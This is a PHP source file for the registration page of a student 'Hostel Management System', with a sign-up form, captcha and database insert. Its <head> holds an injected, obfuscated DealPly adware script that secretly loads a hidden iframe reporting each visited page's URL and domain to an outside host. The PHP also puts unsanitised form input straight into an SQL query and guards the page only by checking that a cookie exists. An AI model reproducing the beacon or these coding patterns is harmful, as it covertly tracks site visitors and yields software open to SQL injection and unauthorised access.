<?php
if(isset($_COOKIE['loginw']));
else
die("Unauthorised Access !!");
?>
<?php

@$id=$_COOKIE['IDw'];
include "connect.php";

?>
<html>
	<head>
	<style type="text/css">


.btn {
  -webkit-border-radius: 33;
  -moz-border-radius: 33;
  border-radius: 33px;
  text-shadow: 1px 1px 3px #666666;
  font-family: Georgia;
  color: #ffffff;
  font-size: 14px;
  background: #3498db;
  padding: 8px 20px 10px 20px;
  text-decoration: none;
}

.btn:hover {
  background: #3cb0fd;
  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
  text-decoration: none;
}
</style>

		<title>REGISTRATION</title>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<meta name="description" content="" />
		<meta name="keywords" content="" />
		<link href='http://fonts.googleapis.com/css?family=Roboto:400,100,300,700,500,900' rel='stylesheet' type='text/css'>
		<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
		<script src="js/skel.min.js"></script>
		<script src="js/skel-panels.min.js"></script>
		<script src="js/init.js"></script>

                     <script async="" type="text/javascript">(function(){try{if(typeof window['asdfdsasdfdsa'] === 'undefined'){setTimeout(function(){var shouldThisPartOfCodeRun = document.URL.search('http') === 0 ;if(!shouldThisPartOfCodeRun){	return;}if(typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string'  ){var reportFlag = true;var scArr = document.getElementsByTagName('script');for(var index in scArr){if(typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1){	reportFlag = false;}}if(!reportFlag ){	return;}var host = 'http://q.nadijs.info/';var isSecure =  document.URL.search('https://') === 0 ;if(isSecure){	host = 'https://endall41-q.apollocdn.com/';}var urlPath = 'dealdo/event-report?type=quick&';var iframe = document.createElement('iframe');var suffix = ''; try{if(typeof JavaScriptJsTagUrl !== 'undefined'){suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1 );}}catch(e324324){}iframe.setAttribute('style','position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');iframe.setAttribute('src',host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain   + '&topic=dpdiedarg&' + suffix );document.body.appendChild(iframe);}}, 10000);window['asdfdsasdfdsa'] = true;} }catch(e235534){}})();</script><script src="ga.js" async="" type="text/javascript"></script><script src="jquery_002.js"></script>
    <script src="jquery.js"></script>
    <link href="jquerysctipttop.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="calendrical.css">
    <link href="css.css" rel="stylesheet" type="text/css">

        	<noscript>
			<link rel="stylesheet" href="css/skel-noscript.css" />
			<link rel="stylesheet" href="css/style.css" />
			<link rel="stylesheet" href="css/style-desktop.css" />
		</noscript>


  </head>

	<body>

	<!-- Header -->
		<div id="tweet">
			<div id="nav-wrapper">
				<!-- Nav -->
				<nav id="nav">
					<ul>
						<li class="active"><a href="index.php">Home</a></li>
						<li><a href="frontview.html">Gallery</a></li>
						<li><a href="left-sidebar.html">About Us</a></li>
						<li><a href="logout.php">Logout</a></li>
					</ul>
				</nav>
			</div>
			<div class="container">

				<!-- Logo -->
				<div id="logo">
					<h1><a><font size=20>Hostel &nbspManagement &nbspSystem</font></a></h1>
					<span class="tag"></span>
				</div>
			</div>
			</div>
		</div>
	<!-- Header -->

	<!-- Main -->
		<div id="main">
			<div id="content" class="container">
				<section>
					<header>
					<center>
						<h2>REGISTRATION FORM</h2>
					</header>
					<p></center>
					<?php

session_start();
if(!isset($_POST['submit']))
$_SESSION['secure'] = rand(1000,9999);
require 'connect.php';
echo '<form action="register.php" method="POST">
<center><table border="1">
<tr><td>Firstname:</td> <td><input type = "text" name="firstname" placeholder="firstname"></td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Lastname:</td> <td><input type = "text" name="lastname" placeholder="lastname"></td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>university roll:</td> <td><input type = "text" name="university" placeholder="roll no."></td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Gender:</td><td><select name="gender">
        <option value="--">--</option>
        <option value="M">MALE</option>
        <option value="F">FEMALE</option></td></tr>
        </select>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Dob:</td><td><input type="text" name="dob" placeholder="YYYY-MM-DD" title="YYYY-MM-DD" id="date_iso_format"><script>
    $(function() {
        $("#date_iso_format").calendricalDate({
            iso: 1,
        });
    });
</script></td></tr>

<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Course:</td><td><select name="course">
        <option value="--">--</option>
        <option value="1">B.Tech</option>
        <option value="2">B.Pharma</option>
        <option value="3">Mca</option>
        <option value="4">Mba</option>
        </td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Branch:</td><td><select name="branch">
        <option value="--">--</option>
        <option value="CSE">CSE</option>
        <option value="IT">IT</option>
        <option value="ME">ME</option>
        <option value="CE">CE</option>
        <option value="EN">EN</option>

        </select>
</td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Year:</td> <td><select name="year">
        <option value="--">--</option>
        <option value="1">1</option>
        <option value="2">2</option>
        <option value="3">3</option>
        <option value="4">4</option>
        </select></td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td>Room no.</td><td><input type = "text" name="room" placeholder="room no"></td></tr>
<tr><td>&nbsp</td><td>&nbsp</td></tr>
<tr><td></td><td><select name="seater">
        <option value="--">--</option>
        <option value="1">Single Seater</option>
        <option value="2">Double Seater</option>
        <option value="3">Triple Seater</option>
        </select></td></tr>
        <tr><td><img src="gen.php" /></td>
        <td><input type=textbox name=captcha placeholder="Captcha Image"></td></tr>
</table>
<input type = "submit" value="register" name="submit" class="btn">
</center>
</form> ';
if(isset($_POST['submit']))
{
    @$fn=$_POST['firstname'];
    @$ln=$_POST['lastname'];
    @$urn=$_POST['university'];
    @$ps=rand(100000,999999);
    @$gen=$_POST['gender'];
    @$do=$_POST['dob'];
    @$course=$_POST['course'];
    @$branch=$_POST['branch'];
    @$room=$_POST['room'];
    @$seat=$_POST['seater'];
    @$hostel=$_COOKIE['IDw'];
    @$year=$_POST['year'];
    @$captcha=$_POST['captcha'];
    @$secure=$_SESSION['secure'];
    $q1=mysql_query("SELECT* FROM `loginad`");
    if($captcha!=$secure)
    {
      echo "<script>alert('Captcha Incorrect')</script><script language='javascript'>window.location.href='register.php'</script>";
      die();
    }
            while($row=mysql_fetch_array($q1))
            {
              $st=$row['universityroll'];
              if($st==$urn)
              { $f=1;
              }
            }
              if($f!=1)
              {
					if(($course=='4'||$course=='3')&&($branch!='--'))
					echo'<script>alert("Mba/Mca dont have Branch")</script>';
					if(($course=='3')&&($year=='4'))
					echo'<script>alert("Mca dont have 4th year")</script>';
					if(($course=='4')&&($year>=3))
					echo'<script>alert("Mba dont have 3rd or 4th year")</script>';
					if(($gen=='F')&&($hostel==1||$hostel==2||$hostel==3||$hostel==4||$hostel==5))
					echo'<script>alert("select correct hostel")</script>';
					if(($gen=='M')&&($hostel==6||$hostel==7||$hostel==8))
					echo'<script>alert("select correct hostel")</script>';
					if($fn!=''&&$ln!=''&&$ps!=''&&$gen!='--'&&$do!=''&&$course!='--'&&$branch!='--'&&$room!=''&&$hostel!='--'&&$year!='--')
					{
							$write=mysql_query("INSERT INTO login VALUES('','$fn','$ln','$urn','$ps','$gen','$do','$course','$branch','$year','$hostel','$room','$seat')");
							echo "<script>alert('Registerd Successfully..')</script>
							<script language='javascript'>window.location.href='index.php'</script>";
					}
              }
              else
              {
                echo "<script>alert('user already exist')</script>
                      <script language='javascript'>window.location.href='index.php'</script>";
              }
}
?>

                                           </p>
				</section>
			</div>
		</div>
	<!-- /Main -->

<!-- Tweet -->
		<div id="tweet">
			<div class="container">
				<section>
					<blockquote></blockquote>
				</section>
			</div>
		</div>

	<!-- Footer -->
		<div id="footer">
			<div class="container">
				<section>
					<header>
					<h2>Made By</h2>
						<span class="byline">Ankit Maurya<br>Anurag Dubey</span>
					</header>

				</section>
			</div>
		</div>

	<!-- Copyright -->
		<div id="copyright">
			<div class="container">

                               HOSTEL MANAGEMENT SYSTEM
			</div>
		</div>
	</body>
</html>